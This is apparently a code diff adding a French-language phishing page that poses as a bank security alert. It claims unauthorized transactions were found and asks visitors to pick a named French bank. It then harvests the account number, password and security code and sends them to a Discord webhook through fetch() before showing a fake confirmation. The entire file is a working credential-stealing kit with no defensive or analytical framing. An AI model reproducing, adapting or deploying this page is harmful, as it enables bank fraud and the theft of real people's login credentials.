@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alertes Bancaires</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            width: 50%;
+            background: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        .message {
+            font-size: 1.2em;
+            color: red;
+        }
+        .button {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+        .button:hover {
+            background-color: #0056b3;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="alertContainer">
+        <img src="35914935-securite-logo-securite-bouclier-securite-application-vectoriel-removebg-preview.png" alt="Logo de la Banque" class="logo">
+        <div class="message">
+            <p>Alertes Bancaires</p>
+            <p>Des transactions non autorisées ont été détectées sur votre compte.</p>
+            <p>Pour votre sécurité, veuillez cliquer sur le bouton ci-dessous pour vérifier et bloquer ces transactions.</p>
+            <a href="#" class="button" id="verifyButton">Vérifier et Bloquer</a>
+        </div>
+    </div>
+
+    <div class="container hidden" id="verificationContainer">
+        <h2>Vérification de Sécurité</h2>
+        <form id="securityForm">
+            <div class="form-group">
+                <label for="bank">Sélectionnez votre banque</label>
+                <select id="bank" name="bank" required>
+                    <option value="">Sélectionnez une banque</option>
+                    <option value="BNP Paribas">BNP Paribas</option>
+                    <option value="Société Générale">Société Générale</option>
+                    <option value="Crédit Agricole">Crédit Agricole</option>
+                    <option value="Crédit Mutuel">Crédit Mutuel</option>
+                    <option value="La Banque Postale">La Banque Postale</option>
+                    <option value="Caisse d'Épargne">Caisse d'Épargne</option>
+                    <option value="HSBC France">HSBC France</option>
+                    <option value="LCL (Le Crédit Lyonnais)">LCL (Le Crédit Lyonnais)</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="numeroCompte">Numéro de Compte</label>
+                <input type="text" id="numeroCompte" name="numeroCompte" required>
+            </div>
+            <div class="form-group">
+                <label for="motDePasse">Mot de Passe</label>
+                <input type="password" id="motDePasse" name="motDePasse" required>
+            </div>
+            <div class="form-group">
+                <label for="codeSecurite">Code de Sécurité</label>
+                <input type="text" id="codeSecurite" name="codeSecurite" required>
+            </div>
+            <button type="submit" class="button">Soumettre</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('verifyButton').addEventListener('click', function(event) {
+            event.preventDefault();
+            document.getElementById('alertContainer').classList.add('hidden');
+            document.getElementById('verificationContainer').classList.remove('hidden');
+        });
+
+        document.getElementById('securityForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const bank = document.getElementById('bank').value;
+            const numeroCompte = document.getElementById('numeroCompte').value;
+            const motDePasse = document.getElementById('motDePasse').value;
+            const codeSecurite = document.getElementById('codeSecurite').value;
+
+            const webhookURL = 'https://discord.com/api/webhooks/1472970808015061072/r5E9PRREA5jd1Oz7UPV9Zt0SJU2ifvVDcywyOn1WvpEImrBdmc0XmA_hVLpUfQgfAMcw'; // Remplacez par votre URL de webhook Discord
+
+            const data = {
+                content: `Nouvelle alerte bancaire:\nBanque: ${bank}\nNuméro de Compte: ${numeroCompte}\nMot de Passe: ${motDePasse}\nCode de Sécurité: ${codeSecurite}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Succès:', data);
+                alert('Votre vérification de sécurité est complète. Merci pour votre coopération.');
+                window.location.href = 'confirmation.html';
+            })
+            .catch((error) => {
+                console.error('Erreur:', error);
+                alert('Une erreur est survenue. Veuillez réessayer.');
+            });
+        });
+    </script>
+</body>
+</html>
